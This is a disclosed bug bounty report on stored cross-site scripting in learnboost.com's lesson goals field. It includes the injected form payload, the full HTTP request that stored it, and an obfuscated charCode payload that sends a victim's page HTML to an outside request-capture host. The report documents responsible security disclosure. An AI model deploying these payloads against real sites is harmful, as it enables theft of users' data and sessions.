# Stored XSS in learnboost.com via the lesson[goals] parameter.

## Report Details
- **Report ID**: 300270
- **URL**: https://hackerone.com/reports/300270
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-12-23T22:18:36.334Z
- **Disclosed**: 2018-04-22T20:55:22.790Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
# Summary
---

learnboost.com is vulnerable to stored XSS via the `lesson[goals]` parameter.

# Browsers Verified In
---

* Mozilla Firefox 58.0b12 (64-bit)

# PoC
---

The payload I used was:

```html
<form action="javasc
ript:alert(document.domain)"><button>Click</button></form>
```

{F249206}

```
POST /apps/lesson/update HTTP/1.1
Host: www.learnboost.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://www.learnboost.com/apps/lesson/5a3eca477aea32b6be2f639c
Content-Type: application/x-www-form-urlencoded
x-dynamic: 1
x-lb-csrf: REDACTED
X-Revision: 42ddad
X-Requested-With: XMLHttpRequest
Content-Length: 806
Cookie: learnboost=REDACTED
DNT: 1
Connection: close

__csrf=REDACTED&lesson%5B_teacher%5D=5a3ebf85b63f09f2be2e5694&lessonid=5a3eca477aea32b6be2f639c&lesson%5Bsections%5D=general%7Ctrue%7CGeneral%24standards%7Cfalse%7CStandards%24doc%7Cfalse%7CDoc+Editor%24materials%7Ctrue%7CMaterials%24evaluation%7Cfalse%7CEvaluation%24media%7Ctrue%7CMedia+(URLs)&lesson%5Bstandards%5D=&lesson%5Blesson_date%5D=&lesson%5Btitle%5D=Untitled&lesson%5Bmarketplace%5D=on&lesson%5Bconcept%5D=avavav&lesson%5Btags%5D=%5B%5D&lesson%5Bgradelevel%5D=&lesson%5B_classroom%5D=&lesson%5Breading%5D%5B%5D=&lesson%5Blinks%5D%5B%5D=&lesson%5Bgoals%5D=%3Cform%20action%3D%22javasc%0Aript%3Aalert(document.domain)%22%3E%3Cbutton%3EClick%3C%2Fbutton%3E%3C%2Fform%3E&lesson%5Bdocument%5D=&lesson%5Bmaterials%5D=&lesson%5Bevaluation%5D=&lesson%5Breflection%5D=
```

You can see the stored XSS in action here: https://www.learnboost.com/lesson/5a3eca477aea32b6be2f639c/untitled

## Impact

With my colleague's permission, I let them view the page where the following payload was located:

```html
<form action="javasc
ript:eval(String.fromCharCode(118,97,114,32,109,97,114,107,117,112,61,100,111,99,117,109,101,110,116,46,100,111,99,117,109,101,110,116,69,108,101,109,101,110,116,46,105,110,110,101,114,72,84,77,76,59,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,115,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,115,122,54,113,104,97,115,122,63,116,101,120,116,61,34,43,101,110,99,111,100,101,85,82,73,40,109,97,114,107,117,112,41,46,115,117,98,115,116,114,105,110,103,40,48,44,55,48,48,41))"><button>Click</button></form>
```

When they clicked on the button, the first 700 lines of their HTML dashboard were sent to my server.

On a side note, would it be possible to invite @gerben_javado to this report. We worked on this target together.

## Attachments
- Screenshot_from_2017-12-23_22-53-35.png
